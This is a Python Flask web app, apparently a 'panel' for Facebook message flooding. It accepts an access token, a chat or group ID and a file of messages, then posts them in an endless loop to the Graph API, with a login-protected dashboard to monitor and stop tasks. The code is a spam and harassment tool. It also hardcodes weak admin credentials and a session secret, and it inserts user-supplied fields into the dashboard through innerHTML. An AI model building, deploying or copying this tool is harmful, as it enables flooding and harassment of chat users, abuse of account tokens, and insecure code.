from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for
import threading, requests, time, datetime

app = Flask(__name__)
app.secret_key = "alex_darkstar_secret_key"  # Secret for session

headers = {'User-Agent': 'Mozilla/5.0'}
runtime_data = {}
stop_flags = {}

# ✅ CHANGE LOGIN CREDENTIALS HERE
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "darkstar"


# =====================================================
# BACKGROUND MESSAGE THREAD FUNCTION
# =====================================================
def send_messages(access_token, thread_id, sender_name, time_interval, messages, task_id):
    start_time = time.time()
    runtime_data[task_id] = {
        "task_id": task_id,
        "fb_name": sender_name,
        "convo_uid": thread_id,
        "token": access_token[:40] + "...",
        "file": "Uploaded",
        "status": "RUNNING",
        "sent_count": 0,
        "start_time": datetime.datetime.now().strftime("%d %b %Y - %I:%M:%S %p"),
        "start_timestamp": start_time
    }

    stop_flags[task_id] = False
    while not stop_flags.get(task_id, False):
        try:
            for msg in messages:
                if stop_flags.get(task_id, False):
                    break
                api_url = f"https://graph.facebook.com/v15.0/t_{thread_id}/"
                message = f"{sender_name}: {msg}"
                params = {'access_token': access_token, 'message': message}
                requests.post(api_url, data=params, headers=headers)
                runtime_data[task_id]["sent_count"] += 1
                time.sleep(time_interval)
        except Exception as e:
            print(f"[{task_id}] Error: {e}")
            time.sleep(3)
    runtime_data[task_id]["status"] = "STOPPED"
    print(f"[{task_id}] Task stopped.")


# =====================================================
# ROUTES
# =====================================================
@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        sender_name = request.form.get('senderName')
        delay = int(request.form.get('delay'))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = f"TASK_{int(time.time())}"
        t = threading.Thread(target=send_messages, args=(access_token, thread_id, sender_name, delay, messages, task_id))
        t.start()
        return render_template_string(HTML_SUCCESS_PAGE, task_id=task_id)

    return render_template_string(HTML_FORM_PAGE)


# LOGIN PAGE
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('username')
        pwd = request.form.get('password')
        if user == ADMIN_USERNAME and pwd == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        else:
            return render_template_string(HTML_LOGIN_PAGE, error="❌ Invalid Username or Password!")
    return render_template_string(HTML_LOGIN_PAGE)


# LOGOUT
@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))


# DASHBOARD PAGE (PROTECTED)
@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template_string(HTML_DASHBOARD_PAGE)


@app.route('/data')
def get_data():
    if not session.get('logged_in'):
        return jsonify([])

    now = time.time()
    tasks = []
    for task_id, info in runtime_data.items():
        uptime = int(now - info.get("start_timestamp", now))
        hours, mins, secs = uptime // 3600, (uptime % 3600) // 60, uptime % 60
        tasks.append({
            **info,
            "uptime": f"{hours}h {mins}m {secs}s"
        })
    return jsonify(tasks)


@app.route('/stop/<task_id>', methods=['POST'])
def stop_task(task_id):
    if not session.get('logged_in'):
        return jsonify({"success": False})

    if task_id in runtime_data:
        stop_flags[task_id] = True
        runtime_data[task_id]["status"] = "STOPPED"
        return jsonify({"success": True})
    return jsonify({"success": False})


# =====================================================
# HTML PAGES
# =====================================================

# 🌞 MAIN FORM PAGE
HTML_FORM_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>ALEX DARKSTAR PANEL</title>
<style>
  body {
    margin: 0; font-family: 'Poppins', sans-serif;
    background: #fff; color: #333;
    display: flex; flex-direction: column;
    align-items: center; justify-content: center;
    min-height: 100vh; padding: 20px;
  }
  .panel {
    background: #fafafa; border: 2px solid #007bff;
    border-radius: 15px; padding: 25px; width: 90%;
    max-width: 420px; box-shadow: 0 0 20px #007bff33;
  }
  input, button {
    width: 100%; padding: 10px; margin: 8px 0;
    border-radius: 8px; border: 1px solid #ccc;
    font-size: 14px;
  }
  input:focus { border-color: #007bff; }
  button {
    background: linear-gradient(90deg,#007bff,#00aaff);
    color: white; font-weight: bold; border: none;
    cursor: pointer; transition: 0.3s;
  }
  button:hover { transform: scale(1.03); }
  a {
    display: block; text-align: center;
    margin-top: 10px; color: #007bff;
    text-decoration: none; font-weight: bold;
  }
</style>
</head>
<body>
  <div class="panel">
    <h2 style="text-align:center;color:#007bff;">🚀 START TASK</h2>
    <form method="post" enctype="multipart/form-data">
      <input type="text" name="accessToken" placeholder="Access Token" required>
      <input type="text" name="threadId" placeholder="Convo/Group UID" required>
      <input type="text" name="senderName" placeholder="Sender Name" required>
      <input type="file" name="txtFile" accept=".txt" required>
      <input type="number" name="delay" placeholder="Delay (sec)" required>
      <button type="submit">Start Now</button>
    </form>
    <a href="/login">🔒 Go to Secure Dashboard</a>
  </div>
</body>
</html>
"""


# 🌞 LOGIN PAGE
HTML_LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>LOGIN - ALEX DARKSTAR</title>
<style>
  body {
    background: #ffffff; color: #333;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; font-family: 'Poppins', sans-serif;
  }
  .login-box {
    background: #f9f9f9; border: 2px solid #007bff;
    padding: 30px; border-radius: 12px;
    box-shadow: 0 0 20px #007bff33;
    width: 90%; max-width: 400px;
  }
  input {
    width: 100%; padding: 10px; margin: 10px 0;
    border-radius: 8px; border: 1px solid #ccc;
  }
  button {
    width: 100%; padding: 10px;
    background: linear-gradient(90deg, #007bff, #00aaff);
    color: white; border: none; border-radius: 8px;
    cursor: pointer; font-weight: bold;
  }
  h2 { text-align:center; color:#007bff; }
  .error { color: red; text-align: center; }
</style>
</head>
<body>
  <div class="login-box">
    <h2>🔒 Secure Login</h2>
    {% if error %}<p class="error">{{ error }}</p>{% endif %}
    <form method="post">
      <input type="text" name="username" placeholder="Username" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  </div>
</body>
</html>
"""


# 🌞 DASHBOARD PAGE (Protected)
HTML_DASHBOARD_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>⚡ LIVE DASHBOARD ⚡</title>
<style>
  body {
    background: #ffffff;
    color: #222;
    font-family: 'Poppins', sans-serif;
    margin: 0; padding: 20px;
  }
  h2 {
    text-align: center; color: #007bff;
    margin-bottom: 20px;
  }
  table {
    width: 100%; border-collapse: collapse;
    margin: auto; max-width: 1000px;
  }
  th, td {
    border: 1px solid #ddd; padding: 8px;
    text-align: center; font-size: 14px;
  }
  th {
    background: #007bff; color: white;
  }
  tr:nth-child(even){ background: #f9f9f9; }
  tr:hover { background: #e9f3ff; }
  .running { color: #00aa00; font-weight: bold; }
  .stopped { color: #ff0000; font-weight: bold; }
  button {
    padding: 5px 10px; border: none;
    border-radius: 5px; color: #fff;
    cursor: pointer; font-weight: bold;
  }
  .stop-btn {
    background: linear-gradient(90deg, #ff3333, #cc0000);
  }
  .logout {
    text-align: center; margin-top: 15px;
  }
  a {
    color: #007bff; text-decoration: none; font-weight: bold;
  }
</style>
</head>
<body>
  <h2>⚡ ALEX DARKSTAR LIVE DASHBOARD ⚡</h2>
  <table id="taskTable">
    <thead>
      <tr>
        <th>TASK ID</th>
        <th>FB NAME</th>
        <th>CONVO UID</th>
        <th>STATUS</th>
        <th>SENT</th>
        <th>UPTIME</th>
        <th>ACTION</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>

  <div class="logout">
    <a href="/logout">🚪 Logout</a>
  </div>

  <script>
    async function fetchData(){
      const res = await fetch('/data');
      const data = await res.json();
      const tbody = document.querySelector('#taskTable tbody');
      tbody.innerHTML = '';
      data.forEach(t=>{
        const row = document.createElement('tr');
        row.innerHTML = `
          <td>${t.task_id}</td>
          <td>${t.fb_name}</td>
          <td>${t.convo_uid}</td>
          <td class="${t.status=='RUNNING'?'running':'stopped'}">${t.status}</td>
          <td>${t.sent_count}</td>
          <td>${t.uptime}</td>
          <td>${t.status=='RUNNING'?'<button class="stop-btn" onclick="stopTask(\\''+t.task_id+'\\')">Stop</button>':'-'}</td>
        `;
        tbody.appendChild(row);
      });
    }
    async function stopTask(id){
      if(confirm('Stop '+id+' ?')){
        await fetch('/stop/'+id, {method:'POST'});
        fetchData();
      }
    }
    setInterval(fetchData, 1000);
    fetchData();
  </script>
</body>
</html>
"""


HTML_SUCCESS_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Started</title></head>
<body style="text-align:center;font-family:sans-serif;background:#fff;">
  <h2 style="color:#007bff;">✅ Task Started Successfully!</h2>
  <p>Go to <a href="/login">Live Dashboard</a> to monitor or stop it.</p>
</body>
</html>
"""


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
